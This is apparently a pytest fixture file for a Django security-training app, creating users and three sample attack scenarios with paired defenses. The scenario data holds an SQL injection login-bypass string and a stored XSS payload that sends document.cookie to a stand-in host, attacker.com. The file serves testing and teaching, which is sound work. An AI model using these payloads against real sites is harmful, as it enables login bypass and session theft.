import pytest
from django.contrib.auth.models import User
from rest_framework.test import APIClient
from scenarios.models import AttackScenario


@pytest.fixture
def api_client():
    """Неавтентифікований клієнт (роль: Гість)."""
    return APIClient()


@pytest.fixture
def admin_user(db):
    """Користувач з роллю Адміністратор."""
    return User.objects.create_superuser(
        username='admin_user',
        email='admin@secureflow.local',
        password='AdminPassword123!',
    )


@pytest.fixture
def admin_client(admin_user):
    """Автентифікований клієнт адміністратора."""
    client = APIClient()
    client.force_authenticate(user=admin_user)
    return client


@pytest.fixture
def student_user(db):
    """Користувач з роллю Студент/Розробник (автор)."""
    return User.objects.create_user(
        username='student_polina',
        email='polina@secureflow.local',
        password='StudentPassword123!',
    )


@pytest.fixture
def student_client(student_user):
    """Автентифікований клієнт студента-автора."""
    client = APIClient()
    client.force_authenticate(user=student_user)
    return client


@pytest.fixture
def other_student_user(db):
    """Інший користувач (студент-неавтор)."""
    return User.objects.create_user(
        username='student_vlada',
        email='vlada@secureflow.local',
        password='StudentPassword123!',
    )


@pytest.fixture
def other_student_client(other_student_user):
    """Автентифікований клієнт іншого студента."""
    client = APIClient()
    client.force_authenticate(user=other_student_user)
    return client


@pytest.fixture
def published_scenario(db, student_user):
    """Опублікований сценарій атаки (доступний публічно)."""
    return AttackScenario.objects.create(
        title="SQL Injection in Auth Form",
        description="Вразливість до класичної SQL ін'єкції у формі входу.",
        vulnerability_type=AttackScenario.VulnerabilityType.SQL_INJECTION,
        severity=AttackScenario.SeverityLevel.HIGH,
        attack_vector="' OR '1'='1' --",
        defense_mechanism="Використання ORM та параметризованих SQL запитів.",
        defense_active=True,
        is_published=True,
        created_by=student_user,
    )


@pytest.fixture
def draft_scenario(db, student_user):
    """Неопублікована чернетка сценарію (створена student_user)."""
    return AttackScenario.objects.create(
        title="Stored XSS in Comment Field",
        description="Збережений XSS вектор через відсутність санітизації HTML.",
        vulnerability_type=AttackScenario.VulnerabilityType.CROSS_SITE_SCRIPTING,
        severity=AttackScenario.SeverityLevel.MEDIUM,
        attack_vector="<script>fetch('http://attacker.com?c=' + document.cookie)</script>",
        defense_mechanism="Екранування виводу та використання DOMPurify / Content-Security-Policy.",
        defense_active=True,
        is_published=False,
        created_by=student_user,
    )


@pytest.fixture
def other_draft_scenario(db, other_student_user):
    """Неопублікована чернетка сценарію іншого студента."""
    return AttackScenario.objects.create(
        title="IDOR Access to User Profile",
        description="Insecure Direct Object Reference при зміні ID в URL.",
        vulnerability_type=AttackScenario.VulnerabilityType.BROKEN_ACCESS_CONTROL,
        severity=AttackScenario.SeverityLevel.CRITICAL,
        attack_vector="GET /api/users/42/profile/",
        defense_mechanism="Перевірка авторизації на рівні об'єкта (Object-level permission check).",
        defense_active=True,
        is_published=False,
        created_by=other_student_user,
    )
